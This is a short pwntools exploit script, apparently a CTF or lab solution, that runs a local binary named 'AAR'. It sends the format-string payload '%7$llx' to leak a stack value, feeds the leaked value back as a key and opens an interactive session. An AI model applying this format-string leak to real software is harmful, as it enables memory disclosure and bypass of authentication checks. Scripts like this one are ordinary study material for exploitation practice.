from pwn import *

context.log_level = 'debug'

p = process("./AAR")

p.recvuntil(b"fmt : ")
fmt = b"%7$llx"
p.sendline(fmt)

key = int(p.recv(8), 16)
p.recvuntil(b"key : ")
p.sendline(str(key).encode())

p.interactive()